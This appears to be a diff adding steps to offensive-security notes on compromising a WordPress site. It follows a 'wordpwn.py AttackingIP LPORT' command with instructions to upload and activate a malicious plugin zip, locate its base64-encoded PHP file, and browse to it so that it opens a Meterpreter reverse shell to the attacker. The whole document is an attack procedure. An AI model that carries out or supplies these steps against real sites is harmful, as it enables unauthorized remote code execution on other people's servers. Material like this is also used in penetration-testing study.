@@ -232,5 +232,18 @@ Syntax:
 python wordpwn.py AttackingIP LPORT Y
 ```
 
+then
+
+```
+Add new->Upload Plugin->upload the malicious.zip-->activate plugin
+
+
+Plugins-->Editor-->gotem plugin---(under edit should tell path i.e. malicious/wetw0rk_maybe.php)
+
+then browse to the base64 encoded php file (i.e.e attack/secret/wp-content/plugins/malicious/wetw0rk_maybe.php
+
+should generate the meterpreter session
+```
+
 
 
